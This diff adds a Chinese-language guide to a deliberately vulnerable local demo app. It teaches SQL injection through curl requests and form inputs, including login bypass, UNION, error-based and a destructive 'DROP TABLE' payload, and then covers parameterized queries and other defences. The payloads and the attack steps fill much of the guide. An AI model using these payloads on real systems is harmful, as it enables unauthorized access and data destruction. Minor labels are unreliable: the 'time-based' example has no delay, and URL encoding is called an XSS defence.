@@ -1,0 +1,259 @@
+===============================================================================
+                    SQL Injection Demo Instructions
+===============================================================================
+
+真实数据库版本的SQL注入演示，包含真正的SQL注入漏洞。
+
+===============================================================================
+                                第一部分：环境准备
+===============================================================================
+
+1. 安装依赖
+```bash
+cd insecure-exchange
+npm install
+```
+
+2. 初始化数据库
+```bash
+npm run init-db
+```
+预期输出：
+- ✅ Dropped existing users table
+- ✅ Created users table
+- ✅ Inserted user1, admin, alice, bob
+- ✅ All users inserted successfully
+
+3. 启动数据库版本服务器
+```bash
+node server-with-db.js
+```
+预期输出：⚠️ INSECURE exchange server with REAL DATABASE running on port 5007
+
+4. 启动前端
+```bash
+cd client
+npm start
+```
+访问地址：http://localhost:3001
+
+===============================================================================
+                                第二部分：SQL注入演示
+===============================================================================
+
+真实SQL注入攻击演示：
+
+1. 基础SQL注入
+```bash
+# 获取所有用户
+curl "http://localhost:5007/api/search?q='%20OR%20'1'='1"
+
+# 获取管理员信息
+curl "http://localhost:5007/api/search?q=admin"
+
+# 搜索密码
+curl "http://localhost:5007/api/search?q=password"
+```
+
+2. 高级SQL注入
+```bash
+# UNION注入
+curl "http://localhost:5007/api/advanced-search?q='%20UNION%20SELECT%20*%20FROM%20users%20--"
+
+# 布尔注入
+curl "http://localhost:5007/api/advanced-search?q='%20AND%20'1'='1"
+
+# 注释注入
+curl "http://localhost:5007/api/advanced-search?q='%20--"
+```
+
+3. 登录绕过
+```bash
+# 使用SQL注入绕过登录
+curl -X POST http://localhost:5007/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin", "password": "' OR '1'='1"}'
+```
+
+4. 数据库信息泄露
+```bash
+# 获取数据库表信息
+curl http://localhost:5007/api/db-info
+```
+
+===============================================================================
+                                第三部分：前端演示
+===============================================================================
+
+1. 访问前端
+- 地址：http://localhost:3001
+- 登录账户：user1/password
+
+2. SQL注入搜索演示
+在"SQL Injection Search"框中输入：
+
+演示1：获取所有用户
+- 输入：' OR '1'='1
+- 点击"Demonstrate SQL Injection"
+- 观察：返回所有用户信息
+
+演示2：UNION注入
+- 输入：' UNION SELECT * FROM users --
+- 点击按钮
+- 观察：尝试联合查询
+
+演示3：布尔注入
+- 输入：' AND '1'='1
+- 点击按钮
+- 观察：布尔条件测试
+
+演示4：注释注入
+- 输入：' --
+- 点击按钮
+- 观察：注释攻击
+
+===============================================================================
+                                第四部分：真实SQL注入原理
+===============================================================================
+
+1. 正常查询
+```sql
+SELECT * FROM users WHERE username = 'user1' AND password = 'password'
+```
+
+2. 恶意注入
+```sql
+-- 输入：' OR '1'='1
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password'
+-- 结果：返回所有用户
+
+-- 输入：' UNION SELECT * FROM users --
+SELECT * FROM users WHERE username = '' UNION SELECT * FROM users --' AND password = 'password'
+-- 结果：联合查询获取所有用户
+
+-- 输入：admin' --
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'password'
+-- 结果：注释掉密码检查，直接登录admin
+```
+
+3. 漏洞代码分析
+```javascript
+// 不安全的代码（当前实现）
+const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+
+// 安全的代码（应该使用）
+const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
+db.get(query, [username, password], callback);
+```
+
+===============================================================================
+                                第五部分：防护措施
+===============================================================================
+
+1. 参数化查询
+```javascript
+// 安全：使用参数化查询
+const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
+db.get(query, [username, password], callback);
+```
+
+2. 输入验证
+```javascript
+// 安全：白名单验证
+const allowedChars = /^[a-zA-Z0-9_]+$/;
+if (!allowedChars.test(input)) {
+    throw new Error('Invalid input');
+}
+```
+
+3. 最小权限原则
+```javascript
+// 安全：使用最小权限的数据库用户
+const dbUser = 'app_user'; // 只有必要权限
+```
+
+4. 错误处理
+```javascript
+// 安全：不暴露数据库错误信息
+try {
+    const result = await db.query(query);
+} catch (error) {
+    logger.error('Database error:', error);
+    throw new Error('Internal server error');
+}
+```
+
+5. 输入编码
+```javascript
+// 安全：HTML编码防止XSS
+const encodedInput = encodeURIComponent(userInput);
+```
+
+===============================================================================
+                                第六部分：测试用例
+===============================================================================
+
+SQL注入测试用例：
+
+1. 基础注入
+- 输入：' OR '1'='1
+- 预期：返回所有用户
+
+2. UNION注入
+- 输入：' UNION SELECT * FROM users --
+- 预期：联合查询获取所有用户
+
+3. 布尔注入
+- 输入：' AND '1'='1
+- 预期：条件为真，返回匹配用户
+
+4. 时间盲注
+- 输入：' AND (SELECT COUNT(*) FROM users) > 0 --
+- 预期：通过响应时间判断条件
+
+5. 错误注入
+- 输入：' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --
+- 预期：通过错误信息获取数据库信息
+
+6. 堆叠查询
+- 输入：'; DROP TABLE users; --
+- 预期：执行多条SQL语句
+
+===============================================================================
+                                第七部分：教育要点
+===============================================================================
+
+通过这个演示，你应该理解：
+
+1. SQL注入的危害
+   - 数据泄露
+   - 权限提升
+   - 数据篡改
+   - 系统破坏
+
+2. 注入原理
+   - 字符串拼接
+   - 查询结构改变
+   - 条件绕过
+
+3. 防护方法
+   - 参数化查询
+   - 输入验证
+   - 最小权限
+   - 错误处理
+
+4. 最佳实践
+   - 使用ORM框架
+   - 定期安全审计
+   - 安全编码培训
+   - 漏洞扫描
+
+===============================================================================
+
+注意事项：
+1. 此演示仅用于教育目的
+2. 不要在生产环境中使用
+3. 所有漏洞都是故意设计的
+4. 在实际项目中要遵循安全最佳实践
+
+=============================================================================== 
